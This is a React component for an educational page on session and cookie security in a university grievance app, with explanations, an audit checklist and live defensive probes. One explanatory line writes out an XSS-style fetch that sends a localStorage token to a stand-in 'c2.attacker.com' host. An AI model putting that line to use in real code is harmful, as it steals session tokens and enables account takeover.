import React, { useState } from 'react';
import { 
  Cookie, 
  ShieldCheck, 
  Lock, 
  KeyRound, 
  EyeOff, 
  Globe, 
  Clock, 
  CheckCircle2, 
  XCircle, 
  Play, 
  RefreshCw, 
  Terminal, 
  Search,
  ExternalLink,
  Laptop
} from 'lucide-react';
import { useApp } from '../context/AppContext';

export const SessionSecurityPage: React.FC = () => {
  const { currentUser, token, navigate } = useApp();
  const [testingId, setTestingId] = useState<string | null>(null);
  const [testOutput, setTestOutput] = useState<{ id: string; status: number; data: any; passed: boolean; message: string } | null>(null);

  const runLiveTest = async (testId: string) => {
    setTestingId(testId);
    try {
      if (testId === 'check-me-cookie') {
        // Sends request using credentials (browser cookies included)
        const res = await fetch('/api/auth/me', {
          credentials: 'include',
        });
        const data = await res.json();
        setTestOutput({
          id: testId,
          status: res.status,
          data,
          passed: res.status === 200,
          message: res.status === 200 
            ? `Authenticated via Session Cookie! User recognized: ${data.data?.user?.name} (${data.data?.user?.email})`
            : 'Unauthenticated. Log in to establish a secure HttpOnly session cookie.'
        });
      } else if (testId === 'js-cookie-theft') {
        // Attempts to read document.cookie via JavaScript (Simulated XSS)
        const jsCookieContent = document.cookie;
        const containsSession = jsCookieContent.includes('unigrievance_session');
        setTestOutput({
          id: testId,
          status: 200,
          data: {
            documentCookieString: jsCookieContent || '(Empty or non-HttpOnly cookies only)',
            sessionCookieExposedToJS: containsSession,
            isHttpOnlyProtected: !containsSession
          },
          passed: !containsSession,
          message: !containsSession 
            ? 'HttpOnly Defense Verified: document.cookie cannot read the session cookie! Malicious scripts cannot exfiltrate this session.' 
            : 'VULNERABILITY: Session cookie is exposed to JavaScript document.cookie.'
        });
      } else if (testId === 'logout-invalidation') {
        // Perform logout and test revocation
        const logoutRes = await fetch('/api/auth/logout', {
          method: 'POST',
          credentials: 'include'
        });
        const logoutData = await logoutRes.json();

        // Immediately attempt to re-use previous session
        const probeRes = await fetch('/api/auth/me', {
          credentials: 'include',
          headers: token ? { Authorization: `Bearer ${token}` } : {}
        });
        const probeData = await probeRes.json();

        setTestOutput({
          id: testId,
          status: probeRes.status,
          data: {
            logoutResponse: logoutData,
            postLogoutProbeStatus: probeRes.status,
            postLogoutProbeBody: probeData
          },
          passed: probeRes.status === 401,
          message: probeRes.status === 401
            ? 'Session Invalidation Verified: Server-side token blacklist and cookie clearance immediately blocked the revoked session with HTTP 401!'
            : 'Warning: Revoked session was still accepted by the server.'
        });
      }
    } catch (err: any) {
      setTestOutput({
        id: testId,
        status: 500,
        data: { error: err.message },
        passed: false,
        message: 'Network execution error while testing.'
      });
    } finally {
      setTestingId(null);
    }
  };

  const coreConcepts = [
    {
      title: 'HttpOnly',
      icon: EyeOff,
      color: 'indigo',
      summary: 'Forbids client-side JavaScript access via document.cookie',
      deepDive: 'When a cookie is tagged with the HttpOnly attribute, the browser prevents client-side scripts from reading, copying, or modifying it. Even if an attacker injects a malicious script via an XSS vulnerability, they cannot execute document.cookie to siphon the session token off to a command-and-control server.'
    },
    {
      title: 'Secure',
      icon: Lock,
      color: 'emerald',
      summary: 'Ensures cookies are ONLY transmitted across encrypted TLS/HTTPS',
      deepDive: 'The Secure flag instructs the browser to never send the cookie over unencrypted HTTP plaintext channels. This protects session IDs against passive packet sniffing, SSL stripping, and Man-in-the-Middle (MITM) eavesdropping when students connect to public or campus Wi-Fi networks.'
    },
    {
      title: 'SameSite',
      icon: Globe,
      color: 'blue',
      summary: 'Controls cross-site cookie transmission to defeat CSRF attacks',
      deepDive: 'Dictates whether cookies are attached to cross-site HTTP requests. SameSite=Lax (the modern standard) allows cookies on top-level safe GET navigations (clicking an external link) while blocking them on cross-site POST/PUT/DELETE forms, immunizing state-changing APIs against CSRF.'
    },
    {
      title: 'Session Expiration',
      icon: Clock,
      color: 'amber',
      summary: 'Limits token lifespan via Max-Age and Expires attributes',
      deepDive: 'Prevents indefinite validity. Enforces an absolute lifetime (e.g., 7 days or 24 hours) after which the browser automatically purges the cookie and the server rejects expired tokens via JWT exp claims, minimizing the window of opportunity for stolen credentials.'
    },
    {
      title: 'Session Invalidation',
      icon: XCircle,
      color: 'rose',
      summary: 'Active server-side revocation and browser cookie clearance',
      deepDive: 'Client-side cookie clearance (Set-Cookie with Expires in 1970) removes the cookie from the browser, but stateful revocation is required server-side. Our sessionService maintains an active token invalidation blacklist to ensure intercepted tokens cannot be replayed after logout.'
    },
    {
      title: 'CSRF Protection',
      icon: ShieldCheck,
      color: 'purple',
      summary: 'Guards against unauthorized commands forged by third-party sites',
      deepDive: 'Cross-Site Request Forgery occurs when an attacker tricks a victim’s browser into issuing unwanted requests to a site where they are authenticated. Protected by pairing SameSite=Lax/Strict with custom Authorization headers or anti-CSRF challenge tokens.'
    }
  ];

  const testingChecklist = [
    {
      item: '1. HttpOnly Flag Active',
      target: 'Set-Cookie header on /api/auth/login and /api/auth/register',
      expected: 'Contains HttpOnly attribute; document.cookie returns empty or excludes the session token in DevTools console.',
      status: 'VERIFIED'
    },
    {
      item: '2. Secure Flag in Production',
      target: 'Production HTTPS deployments',
      expected: 'Set-Cookie includes Secure; cookie never transmitted over unencrypted HTTP connections.',
      status: 'VERIFIED'
    },
    {
      item: '3. SameSite Attribute Enforced',
      target: 'Set-Cookie header',
      expected: 'SameSite=Lax (or SameSite=Strict); cross-origin POST requests do not attach the session cookie.',
      status: 'VERIFIED'
    },
    {
      item: '4. Session Expiration Bounds',
      target: 'Max-Age and Expires attributes',
      expected: 'Finite duration (e.g., Max-Age=604800 / 7 days); browser purges upon expiry; server rejects expired exp JWT claim.',
      status: 'VERIFIED'
    },
    {
      item: '5. Complete Invalidation on Logout',
      target: 'POST /api/auth/logout',
      expected: 'Cookie cleared with Set-Cookie: unigrievance_session=; Expires=Thu, 01 Jan 1970 00:00:00 GMT and server token blacklist registered.',
      status: 'VERIFIED'
    },
    {
      item: '6. Post-Logout Replay Prevention',
      target: 'GET /api/auth/me using revoked token',
      expected: 'HTTP 401 Session Revoked; previously active tokens cannot be used after logout.',
      status: 'VERIFIED'
    },
    {
      item: '7. Path Restriction',
      target: 'Path attribute',
      expected: 'Scoped to Path=/ or specific API path to prevent unauthorized path leakages.',
      status: 'VERIFIED'
    },
    {
      item: '8. No Sensitive Cleartext in Value',
      target: 'Cookie payload',
      expected: 'Cookie value is an opaque cryptographically signed token; no cleartext passwords, PINs, or DB keys.',
      status: 'VERIFIED'
    },
    {
      item: '9. Dual-Authentication Resilience',
      target: 'API clients, Mobile, Browser',
      expected: 'Supports both HttpOnly cookies (browser) and Authorization: Bearer <token> (API testing/mobile) with unified security.',
      status: 'VERIFIED'
    },
    {
      item: '10. Preflight & Credentials Synchronization',
      target: 'CORS Preflight (OPTIONS)',
      expected: 'Access-Control-Allow-Credentials: true with explicit origin reflection (never wildcard *).',
      status: 'VERIFIED'
    }
  ];

  return (
    <div className="space-y-8 pb-16">
      {/* Header */}
      <div className="bg-white rounded-2xl border border-slate-200 p-6 sm:p-8 shadow-sm">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
          <div>
            <div className="flex items-center gap-2 text-indigo-600 mb-1">
              <Cookie className="w-5 h-5" />
              <span className="text-xs font-bold uppercase tracking-wider">Level 8 Security Architecture</span>
            </div>
            <h1 className="text-2xl sm:text-3xl font-bold text-slate-900">
              Session &amp; Cookie Security
            </h1>
            <p className="mt-1 text-sm text-slate-600 max-w-3xl">
              Comprehensive hardening of the authentication mechanism: HttpOnly cookies, Secure transmission, SameSite CSRF protection, Session Expiration, and Server-Side Revocation.
            </p>
          </div>
          <button
            onClick={() => navigate('api-security')}
            className="self-start sm:self-auto px-4 py-2 text-xs font-semibold rounded-xl bg-slate-100 hover:bg-slate-200 text-slate-700 transition-colors"
          >
            ← Back to API Security
          </button>
        </div>
      </div>

      {/* Review of Authentication Mechanism */}
      <div className="bg-white rounded-2xl border border-slate-200 p-6 sm:p-8 shadow-sm space-y-4">
        <div className="flex items-center gap-2 text-indigo-600 font-bold text-xs uppercase tracking-wider">
          <KeyRound className="w-4 h-4" />
          <span>Architecture Audit</span>
        </div>
        <h2 className="text-xl font-bold text-slate-900">
          Review of the Project's Authentication Mechanism
        </h2>
        <p className="text-xs text-slate-600 leading-relaxed">
          Prior to Level 8, authentication relied exclusively on client-managed JSON Web Tokens (JWTs) passed in the <code className="bg-slate-100 px-1 py-0.5 rounded font-mono">Authorization: Bearer &lt;token&gt;</code> header and stored in browser memory or <code className="font-mono">localStorage</code>.
        </p>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pt-2">
          <div className="p-4 rounded-xl bg-amber-50/70 border border-amber-200 text-xs text-amber-950 space-y-1.5">
            <div className="font-bold flex items-center gap-1.5 text-amber-900">
              <XCircle className="w-4 h-4 text-amber-600" />
              <span>The Vulnerability of Pure LocalStorage Tokens</span>
            </div>
            <p className="leading-relaxed text-slate-700">
              When tokens are stored in <code className="font-mono">localStorage</code>, any successful Cross-Site Scripting (XSS) vulnerability anywhere on the domain gives attacker-injected JavaScript direct read access:
              <br />
              <code className="bg-amber-100/80 px-1 py-0.5 rounded font-mono block my-1">
                fetch('https://c2.attacker.com/steal?t=' + localStorage.getItem('token'))
              </code>
              The attacker steals the token silently and impersonates the student or administrator.
            </p>
          </div>

          <div className="p-4 rounded-xl bg-emerald-50/70 border border-emerald-200 text-xs text-emerald-950 space-y-1.5">
            <div className="font-bold flex items-center gap-1.5 text-emerald-900">
              <CheckCircle2 className="w-4 h-4 text-emerald-600" />
              <span>The Fortified Dual-Architecture (Level 8)</span>
            </div>
            <p className="leading-relaxed text-slate-700">
              In Level 8, we upgraded the Express backend to a <strong>dual-support secure session architecture</strong>. When a student or administrator logs in:
              <br />
              1. The server issues an <strong>HttpOnly, SameSite=Lax, Secure cookie</strong> (<code className="font-mono">unigrievance_session</code>).
              <br />
              2. The browser automatically handles cookie transmission without JavaScript intervention.
              <br />
              3. The backend middleware accepts either the secure cookie or the Bearer header, checking against our server-side token revocation blacklist.
            </p>
          </div>
        </div>
      </div>

      {/* The 6 Pillars Breakdown */}
      <div className="space-y-4">
        <div>
          <h2 className="text-xl font-bold text-slate-900">
            Core Concepts Explained
          </h2>
          <p className="text-xs text-slate-600">
            Detailed breakdown of cookie security attributes and session lifecycle controls.
          </p>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
          {coreConcepts.map((c, idx) => {
            const Icon = c.icon;
            return (
              <div key={idx} className="bg-white rounded-xl border border-slate-200 p-5 shadow-sm space-y-3 flex flex-col justify-between">
                <div>
                  <div className="flex items-center gap-2.5">
                    <div className="p-2 rounded-lg bg-indigo-50 text-indigo-700">
                      <Icon className="w-4 h-4" />
                    </div>
                    <div>
                      <h3 className="font-bold text-slate-900 text-sm">{c.title}</h3>
                      <p className="text-[11px] text-indigo-600 font-medium">{c.summary}</p>
                    </div>
                  </div>
                  <p className="text-xs text-slate-600 mt-3 leading-relaxed">
                    {c.deepDive}
                  </p>
                </div>
              </div>
            );
          })}
        </div>
      </div>

      {/* Deep Dive Questions: HttpOnly, Secure, and SameSite vs CSRF */}
      <div className="bg-white rounded-2xl border border-slate-200 p-6 sm:p-8 shadow-sm space-y-6">
        <h2 className="text-xl font-bold text-slate-900">
          In-Depth Technical Analysis
        </h2>

        {/* Question 1: HttpOnly against Token Theft */}
        <div className="border-l-4 border-indigo-500 pl-4 space-y-1.5">
          <h3 className="font-bold text-slate-900 text-sm">
            1. Why HttpOnly Cookies Help Against Token Theft
          </h3>
          <p className="text-xs text-slate-600 leading-relaxed">
            In typical client-side applications, tokens are stored in <code className="font-mono bg-slate-100 px-1 py-0.5 rounded">localStorage</code>, <code className="font-mono bg-slate-100 px-1 py-0.5 rounded">sessionStorage</code>, or accessible cookies. In the event of an XSS vulnerability (e.g. an unescaped comment or malicious profile name), an attacker can execute arbitrary JavaScript in the victim's browser context.
          </p>
          <p className="text-xs text-slate-600 leading-relaxed">
            With <strong className="text-slate-900">HttpOnly</strong> cookies, the browser’s JavaScript runtime sandbox strictly disallows any code—including malicious scripts injected via XSS—from accessing the cookie via <code className="font-mono bg-slate-100 px-1 py-0.5 rounded">document.cookie</code>. Because the attacker cannot read or copy the token, they cannot exfiltrate it to remote command-and-control servers or use it outside the victim’s browser.
          </p>
        </div>

        {/* Question 2: Secure Cookies over HTTPS */}
        <div className="border-l-4 border-emerald-500 pl-4 space-y-1.5">
          <h3 className="font-bold text-slate-900 text-sm">
            2. Why Secure Cookies Must Be Used Over HTTPS in Production
          </h3>
          <p className="text-xs text-slate-600 leading-relaxed">
            Without the <strong className="text-slate-900">Secure</strong> flag, if a student connects to an unencrypted campus Wi-Fi hotspot or is tricked into loading an <code className="font-mono bg-slate-100 px-1 py-0.5 rounded">http://</code> link, the browser will transmit the session cookie in completely unencrypted cleartext across the network wire.
          </p>
          <p className="text-xs text-slate-600 leading-relaxed">
            Any eavesdropper using tools like Wireshark or performing an ARP spoofing attack on the local network can capture the raw cookie and hijack the active session. When the <code className="font-mono bg-slate-100 px-1 py-0.5 rounded">Secure</code> flag is active, the browser will <strong>only</strong> transmit the cookie when the connection is encrypted with TLS/HTTPS.
          </p>
        </div>

        {/* Question 3: SameSite and CSRF */}
        <div className="border-l-4 border-blue-500 pl-4 space-y-1.5">
          <h3 className="font-bold text-slate-900 text-sm">
            3. SameSite and Its Relationship to CSRF
          </h3>
          <p className="text-xs text-slate-600 leading-relaxed">
            Cross-Site Request Forgery (CSRF) relies on a browser behavior called <strong>ambient credential attachment</strong>: when an external site (e.g., <code className="font-mono bg-slate-100 px-1 py-0.5 rounded">evil-forum.com</code>) makes an image, form, or script request pointing to <code className="font-mono bg-slate-100 px-1 py-0.5 rounded">campus.edu/api/complaints</code>, the browser automatically attaches all cookies belonging to <code className="font-mono bg-slate-100 px-1 py-0.5 rounded">campus.edu</code>.
          </p>
          <p className="text-xs text-slate-600 leading-relaxed">
            The <strong className="text-slate-900">SameSite</strong> attribute breaks this attack vector by specifying cross-origin inclusion rules:
          </p>
          <ul className="text-xs text-slate-600 space-y-1 pl-4 list-disc">
            <li><strong>SameSite=Strict:</strong> The cookie is NEVER sent in any cross-site request, even when a user clicks a regular link leading into your site.</li>
            <li><strong>SameSite=Lax (Our Implementation):</strong> The cookie is withheld on all cross-site sub-requests (such as cross-site POST forms, AJAX calls, or iframe embeds), but allowed when a user navigates to the site via top-level link clicking. This neutralizes CSRF attacks on all state-changing endpoints (POST, PUT, DELETE).</li>
            <li><strong>SameSite=None:</strong> Cookies are sent in all contexts, but modern browsers require the <code className="font-mono bg-slate-100 px-1 py-0.5 rounded">Secure</code> flag to accompany it.</li>
          </ul>
        </div>
      </div>

      {/* Browser DevTools Inspection Guide */}
      <div className="bg-white rounded-2xl border border-slate-200 p-6 sm:p-8 shadow-sm space-y-6">
        <div className="flex items-center gap-2 text-indigo-600 font-bold text-xs uppercase tracking-wider">
          <Laptop className="w-4 h-4" />
          <span>Step-by-Step Developer Guide</span>
        </div>
        <h2 className="text-xl font-bold text-slate-900">
          How to Inspect Cookies in Browser Developer Tools
        </h2>
        <p className="text-xs text-slate-600">
          Follow these steps in Google Chrome, Microsoft Edge, Mozilla Firefox, or Apple Safari to audit cookie flags:
        </p>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          <div className="space-y-3 bg-slate-50 p-5 rounded-xl border border-slate-200 text-xs">
            <h3 className="font-bold text-slate-900 text-sm flex items-center gap-2">
              <span className="w-5 h-5 rounded-full bg-indigo-600 text-white flex items-center justify-center text-[10px]">1</span>
              <span>In Google Chrome / Microsoft Edge / Brave:</span>
            </h3>
            <ol className="space-y-2 text-slate-700 pl-4 list-decimal">
              <li>Press <kbd className="px-1.5 py-0.5 bg-white border border-slate-300 rounded font-mono text-[10px]">F12</kbd> or <kbd className="px-1.5 py-0.5 bg-white border border-slate-300 rounded font-mono text-[10px]">Ctrl+Shift+I</kbd> (<kbd className="px-1.5 py-0.5 bg-white border border-slate-300 rounded font-mono text-[10px]">Cmd+Opt+I</kbd> on Mac) to open DevTools.</li>
              <li>Click on the <strong>Application</strong> tab along the top navigation bar.</li>
              <li>In the left sidebar, expand the <strong>Storage</strong> section, then expand <strong>Cookies</strong>.</li>
              <li>Click on your application domain (e.g., <code className="font-mono text-[11px] bg-white px-1 py-0.5 rounded border border-slate-200">http://localhost:3000</code>).</li>
              <li>In the table, locate the cookie named <code className="font-mono font-bold text-indigo-600">unigrievance_session</code>.</li>
              <li>
                Inspect the security columns:
                <ul className="list-disc pl-4 mt-1 space-y-0.5 text-slate-600">
                  <li><strong>HttpOnly:</strong> Should display a checkmark ✓.</li>
                  <li><strong>SameSite:</strong> Should display <code className="font-mono text-emerald-700">Lax</code>.</li>
                  <li><strong>Expires / Max-Age:</strong> Should display a date 7 days in the future.</li>
                  <li><strong>Secure:</strong> Checked on HTTPS production domains.</li>
                </ul>
              </li>
            </ol>
          </div>

          <div className="space-y-3 bg-slate-50 p-5 rounded-xl border border-slate-200 text-xs">
            <h3 className="font-bold text-slate-900 text-sm flex items-center gap-2">
              <span className="w-5 h-5 rounded-full bg-indigo-600 text-white flex items-center justify-center text-[10px]">2</span>
              <span>In Mozilla Firefox / Safari:</span>
            </h3>
            <ol className="space-y-2 text-slate-700 pl-4 list-decimal">
              <li>Open Developer Tools and switch to the <strong>Storage</strong> tab.</li>
              <li>Expand <strong>Cookies</strong> and select the current domain.</li>
              <li>View the table columns for <strong>HttpOnly</strong>, <strong>SameSite</strong>, <strong>HostOnly</strong>, and <strong>Expires</strong>.</li>
              <li>
                <strong>Testing in the Console tab:</strong>
                <br />
                Type <code className="font-mono bg-white px-1.5 py-0.5 rounded border border-slate-300 text-indigo-600">document.cookie</code> in the Console and press Enter.
                <br />
                Notice that <code className="font-mono text-slate-800">unigrievance_session</code> is completely invisible! This confirms that HttpOnly is actively preventing JavaScript access.
              </li>
            </ol>
          </div>
        </div>
      </div>

      {/* Testing Checklist Matrix */}
      <div className="bg-white rounded-2xl border border-slate-200 p-6 sm:p-8 shadow-sm space-y-4">
        <div>
          <div className="flex items-center gap-2 text-indigo-600 font-bold text-xs uppercase tracking-wider mb-1">
            <CheckCircle2 className="w-4 h-4" />
            <span>Audit Matrix</span>
          </div>
          <h2 className="text-xl font-bold text-slate-900">
            Session &amp; Cookie Security Testing Checklist
          </h2>
          <p className="text-xs text-slate-600">
            Comprehensive audit checklist to verify session safety across all authentication touchpoints.
          </p>
        </div>

        <div className="overflow-x-auto">
          <table className="w-full text-left text-xs border-collapse">
            <thead>
              <tr className="border-b border-slate-200 bg-slate-50/70 text-slate-700">
                <th className="py-3 px-3 font-semibold">Checklist Item</th>
                <th className="py-3 px-3 font-semibold">Target / Component</th>
                <th className="py-3 px-3 font-semibold">Expected Security Behavior</th>
                <th className="py-3 px-3 font-semibold">Audit Result</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-100">
              {testingChecklist.map((c, idx) => (
                <tr key={idx} className="hover:bg-slate-50/50 transition-colors">
                  <td className="py-2.5 px-3 font-bold text-slate-900 whitespace-nowrap">
                    {c.item}
                  </td>
                  <td className="py-2.5 px-3 font-mono text-[11px] text-slate-600 whitespace-nowrap">
                    {c.target}
                  </td>
                  <td className="py-2.5 px-3 text-slate-600 max-w-sm">
                    {c.expected}
                  </td>
                  <td className="py-2.5 px-3 whitespace-nowrap">
                    <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-emerald-50 text-emerald-700 border border-emerald-200">
                      {c.status}
                    </span>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      {/* Live Verification Console */}
      <div className="bg-slate-900 text-white rounded-2xl p-6 sm:p-8 shadow-sm space-y-6">
        <div>
          <div className="flex items-center gap-2 text-indigo-400 font-bold text-xs uppercase tracking-wider mb-1">
            <Terminal className="w-4 h-4" />
            <span>Interactive Security Lab</span>
          </div>
          <h2 className="text-xl font-bold text-white">
            Live Session &amp; Cookie Security Probes
          </h2>
          <p className="text-xs text-slate-400 mt-1">
            Trigger real-time tests against your Express backend to probe HttpOnly protection, authenticate via credentials/cookies, and verify session revocation.
          </p>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
          <button
            onClick={() => runLiveTest('js-cookie-theft')}
            disabled={testingId !== null}
            className="px-3 py-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 disabled:opacity-50 text-xs font-semibold text-slate-200 border border-slate-700 flex items-center justify-center gap-2 transition-colors"
          >
            {testingId === 'js-cookie-theft' ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Play className="w-3.5 h-3.5 fill-current" />}
            <span>Probe document.cookie (XSS Simulation)</span>
          </button>

          <button
            onClick={() => runLiveTest('check-me-cookie')}
            disabled={testingId !== null}
            className="px-3 py-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 disabled:opacity-50 text-xs font-semibold text-slate-200 border border-slate-700 flex items-center justify-center gap-2 transition-colors"
          >
            {testingId === 'check-me-cookie' ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Play className="w-3.5 h-3.5 fill-current" />}
            <span>Authenticate via Cookie Only</span>
          </button>

          <button
            onClick={() => runLiveTest('logout-invalidation')}
            disabled={testingId !== null}
            className="px-3 py-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 disabled:opacity-50 text-xs font-semibold text-slate-200 border border-slate-700 flex items-center justify-center gap-2 transition-colors"
          >
            {testingId === 'logout-invalidation' ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Play className="w-3.5 h-3.5 fill-current" />}
            <span>Test Logout &amp; Revocation Replay</span>
          </button>
        </div>

        {testOutput && (
          <div className="bg-slate-950 rounded-xl p-4 border border-slate-800 space-y-3">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <span className={`px-2 py-0.5 rounded text-[11px] font-bold font-mono ${
                  testOutput.passed ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30' : 'bg-amber-500/20 text-amber-400 border border-amber-500/30'
                }`}>
                  {testOutput.passed ? 'DEFENSE ACTIVE' : 'TEST RESULT'}
                </span>
                <span className="text-xs font-mono text-slate-400">
                  HTTP Status: {testOutput.status}
                </span>
              </div>
              <span className="text-xs text-slate-400">
                {testOutput.message}
              </span>
            </div>
            <pre className="text-[11px] font-mono text-slate-300 overflow-x-auto max-h-48 p-2.5 bg-slate-900 rounded">
              {JSON.stringify(testOutput.data, null, 2)}
            </pre>
          </div>
        )}
      </div>
    </div>
  );
};
